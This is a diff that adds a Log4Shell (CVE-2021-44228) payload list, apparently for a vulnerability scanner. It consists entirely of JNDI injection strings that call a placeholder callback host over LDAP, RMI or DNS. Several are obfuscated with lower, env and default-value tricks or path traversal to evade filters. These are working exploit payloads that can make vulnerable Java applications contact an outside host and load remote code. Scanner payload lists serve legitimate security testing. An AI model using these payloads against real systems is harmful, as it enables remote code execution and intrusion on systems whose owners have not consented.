@@ -1,0 +1,14 @@
+# Log4Shell Payloads (CVE-2021-44228)
+${jndi:ldap://SESAMO_CALLBACK/a}
+${jndi:rmi://SESAMO_CALLBACK/a}
+${jndi:dns://SESAMO_CALLBACK/a}
+${jndi:ldap://SESAMO_CALLBACK}
+${jndi:rmi://SESAMO_CALLBACK}
+${${lower:j}ndi:${lower:l}da${lower:p}://SESAMO_CALLBACK/a}
+${${env:FOO:-j}ndi:${env:FOO:-l}dap://SESAMO_CALLBACK/a}
+${jndi:ldap://SESAMO_CALLBACK:1389/a}
+${jndi:ldap://SESAMO_CALLBACK/123456}
+${jndi:ldap://SESAMO_CALLBACK/../a}
+${jndi:ldap://SESAMO_CALLBACK/../../../a}
+${::-j}ndi:ldap://SESAMO_CALLBACK/a
+${${::-j}ndi:ldap://SESAMO_CALLBACK/a}
